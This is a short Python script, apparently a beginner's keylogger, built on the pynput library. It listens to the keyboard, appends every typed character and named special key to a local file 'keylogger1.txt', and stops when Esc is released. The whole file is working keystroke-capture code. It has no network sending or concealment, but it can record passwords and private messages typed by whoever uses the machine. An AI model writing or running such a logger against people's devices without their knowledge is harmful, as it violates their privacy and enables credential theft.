from pynput import keyboard


def key():
    def write(text):
        with open("keylogger1.txt", 'a') as f:
            f.write(text)
            f.close()

    def on_key_press(Key):
        try:
            if Key == keyboard.Key.enter:
                write("\n")
            else:
                write(Key.char)
        except AttributeError:
            if Key == keyboard.Key.backspace:
                write("\nBackspace Pressed\n")
            elif Key == keyboard.Key.tab:
                write("\nTab Pressed\n")
            elif Key == keyboard.Key.space:
                write(" ")
            else:
                temp = repr(Key) + " Pressed.\n"
                write(temp)
                print("\n{} Pressed\n".format(Key))

    def on_key_release(Key):
        # Pressing "esc" stops the Keylogger to listen key strokes.
        if Key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()


if __name__ == "__main__":
    key()
